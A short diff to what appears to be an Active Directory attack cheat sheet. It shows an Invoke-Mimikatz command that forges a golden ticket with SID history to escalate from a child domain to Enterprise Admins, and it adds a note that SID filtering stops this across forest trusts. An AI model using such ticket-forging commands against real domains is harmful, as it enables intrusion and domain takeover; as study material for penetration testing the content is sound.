@@ -877,6 +877,8 @@ krbtgt -
 ```
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:child.parent.lab /sid:S-1-5-21-<currentdomainSID> /sids:S-1-5-21-<parentdomainSID>-519 /krbtgt:f052addf1d43f864a7d0c21cbce440c9 /ticket:C:\Temp\krbtgt_tkt.kirbi"'
 ```
+#### Across Forests - Inter-Forest Trust
+There is SID filtering across forests so abusing SID history to force ```/-519``` for Enterprise Admins will not work when abusing external forest trusts.
 
 # MS SQL
 
